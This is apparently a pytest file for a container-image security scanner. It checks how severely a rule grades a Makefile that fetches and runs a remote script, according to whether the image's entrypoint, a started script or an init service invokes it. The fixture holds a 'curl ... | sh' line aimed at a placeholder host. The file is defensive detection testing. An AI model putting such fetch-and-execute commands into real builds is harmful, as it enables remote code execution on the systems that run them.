"""An image runs what its configuration and init system start (review 98: option A, for images)."""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config import Config
from cordon_scanner.foundation.models import Severity
from imagekit import ImageKit

FETCH_RUN = b"all:\n\tcurl -fsSL https://example.invalid/i.sh | sh\n"
RULE = "SUSPECT.BUILD.MAKE_FETCH_EXEC.001"


class StartKit:
    @staticmethod
    def grades(tmp_path: Path, entrypoint: list[str], extra: dict[str, bytes] | None = None):
        files = {
            "usr/local/bin/serve": b"#!/bin/sh\nexec sleep infinity\n",
            "opt/tools/Makefile": FETCH_RUN,
        }
        files.update(extra or {})
        target = tmp_path / "service.tar"
        config = {"config": {"Entrypoint": entrypoint}}
        target.write_bytes(ImageKit.docker_save([ImageKit.layer(files)], config))
        found = Scanner(Config.default().with_overrides(use_cache=False)).scan(target).findings
        return [f.severity for f in found if f.rule_id == RULE]


class TestWhatAnImageStarts:
    def test_a_build_file_nothing_starts_is_reported_below_the_gate(self, tmp_path):
        grades = StartKit.grades(tmp_path, ["/usr/local/bin/serve"])
        assert grades
        assert all(g <= Severity.MEDIUM for g in grades)

    def test_what_the_entrypoint_runs_keeps_its_grade(self, tmp_path):
        grades = StartKit.grades(tmp_path, ["make", "-f", "/opt/tools/Makefile"])
        assert any(g >= Severity.HIGH for g in grades)

    def test_what_a_started_script_names_keeps_its_grade(self, tmp_path):
        serve = b"#!/bin/sh\nmake -f /opt/tools/Makefile\nexec sleep infinity\n"
        grades = StartKit.grades(tmp_path, ["/usr/local/bin/serve"], {"usr/local/bin/serve": serve})
        assert any(g >= Severity.HIGH for g in grades)

    def test_an_init_system_service_is_started(self, tmp_path):
        run = b"#!/bin/sh\nexec make -f /opt/tools/Makefile\n"
        grades = StartKit.grades(
            tmp_path, ["/init"], {"etc/services.d/tools/run": run, "init": b"#!/bin/sh\n"}
        )
        assert any(g >= Severity.HIGH for g in grades)
